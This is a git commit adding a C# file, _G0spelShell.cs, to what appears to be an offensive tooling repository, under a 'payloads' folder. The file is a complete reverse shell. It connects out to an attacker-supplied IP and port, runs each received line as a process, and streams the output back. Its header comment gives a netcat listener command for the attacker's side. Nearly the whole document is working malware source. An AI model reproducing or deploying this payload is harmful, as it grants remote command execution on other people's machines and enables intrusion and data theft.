7374971a66de0739e6bbb539e1a26343fcd1834c
reyreyiam <elyziahreyes@gmail.com>
2020-03-31 02:21:44 -0500

    Added _G0spelShell
    Connect Back Payload in C#

---
+++ GHCSharp/payloads/_4G0spelShell/_G0spelShell.cs
@@ -0,0 +1,66 @@
+//Author: x3assexe
+//Date: 31032020
+//Summmary::Connect Back Payload
+/*******************************
+*ex. _G0spelShell.exe <ip> <port>
+*Simple connect back payload
+*Required arguments are  attacker ip> and attacker <port>
+*Receiving connection should be listenining on given port
+* ex. attacker: nc -nvlp <port>
+*/
+
+using System;
+using System.Net.Sockets;
+using System.IO;
+using System.Diagnostics;
+using System.Text;
+using System.Linq;
+
+namespace GOSPELSHELL
+{
+    public class GOSPELSHELLCLASS
+    {
+        public static void Main (string[] args)
+        {
+            using (TcpClient client  = new TcpClient (args [0], int.Parse (args [1]))) {
+                using  (Stream stream =client.GetStream ()) {
+                    using (StreamReader rdr = new StreamReader (stream)) {
+                        while (true){
+                            string _shell = rdr.ReadLine();
+
+                            if (string.IsNullOrEmpty (_shell)){
+                                rdr.Close();
+                                stream.Close();
+                                client.Close();
+                                return;
+                            }
+
+                            if (string.IsNullOrWhiteSpace(_shell))
+                                continue;
+                            //4.3Reads command from screen and parses command.
+                            string[] split = _shell.Trim().Split(' ');
+                            string filename = split.First();
+                            string arg = string.Join(" ", split.Skip(1));
+
+                            try {
+                                Process prc = new Process();
+                                prc.StartInfo = new ProcessStartInfo();
+                                prc.StartInfo.FileName = filename;
+                                prc.StartInfo.Arguments = arg;
+                                prc.StartInfo.UseShellExecute = false;
+                                prc.StartInfo.RedirectStandardOutput = true;
+                                prc.Start();
+                                prc.StandardOutput.BaseStream.CopyTo(stream);
+                                prc.WaitForExit();
+                            } catch {
+                                string UBAD = "Error running command " + _shell + "\n";
+                                byte[] errorBytes = Encoding.ASCII.GetBytes(UBAD);
+                                stream.Write(errorBytes, 0, errorBytes.Length);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
